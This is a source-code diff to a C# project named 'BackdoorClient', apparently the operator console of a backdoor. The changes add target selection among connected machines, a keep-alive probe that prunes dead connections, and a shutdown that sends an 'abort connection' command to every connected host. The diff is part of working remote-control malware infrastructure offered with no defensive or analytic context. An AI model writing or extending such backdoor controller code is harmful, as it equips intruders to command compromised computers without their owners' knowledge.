@@ -12,6 +12,7 @@ namespace BackdoorClient
     {
         public Action OnClientConnect = null;
         public Action OnClientDisсonnect = null;
+        public Action<Socket> OnSetTarget = null;
         public List<Socket> connection { get; private set; } = new List<Socket>();
 
         private Socket target = null;
@@ -59,6 +60,7 @@ namespace BackdoorClient
             try
             {
                 target = connection[indexInConnection];
+                OnSetTarget?.Invoke(target);
             }
             catch (Exception)
             {
@@ -67,15 +69,26 @@ namespace BackdoorClient
 
         public void DestroyServer()
         {
-          if(threadHandleConnections != null &&
-            threadHandleDisconnections != null)
-          {
+            if (threadHandleConnections != null &&
+              threadHandleDisconnections != null)
+            {
+                
                 sockBinder.Close();
                 sockBinder.Dispose();
                 threadHandleConnections.Abort();
                 threadHandleDisconnections.Abort();
-          }
-           
+            }
+            for (int i = 0; i < connection.Count; i++)
+            {
+                try
+                {
+                    connection[i].Send(Encoding.UTF8.GetBytes("abort connection"));
+                    connection[i].Receive(new byte[100000]);
+                }
+                catch
+                { }
+                connection[i].Close();
+            }
         }
 
         private void Listen()
@@ -112,8 +125,8 @@ namespace BackdoorClient
                 sockBinder.Listen(1);
 
                 var conn = sockBinder.Accept();
-                if (connection.Count == 0) target = conn;
                 connection.Add(conn);
+                if (connection.Count == 1) SetTarget(0);
                 OnClientConnect?.Invoke();
 
                 sockBinder.Dispose();
@@ -127,10 +140,20 @@ namespace BackdoorClient
                 Thread.Sleep(100);
                 for (int i = 0; i < connection.Count; i++)
                 {
+                    try
+                    {
+                        connection[i].Send(Encoding.UTF8.GetBytes("test_connect"));
+                        continue;
+                    }
+                    catch
+                    {
+
+                    }
                     if (!connection[i].Connected)
                     {
-                        OnClientDisсonnect?.Invoke();
                         connection[i].Dispose();
+                        connection.Remove(connection[i]);
+                        OnClientDisсonnect?.Invoke();
                     }
                 }
             }
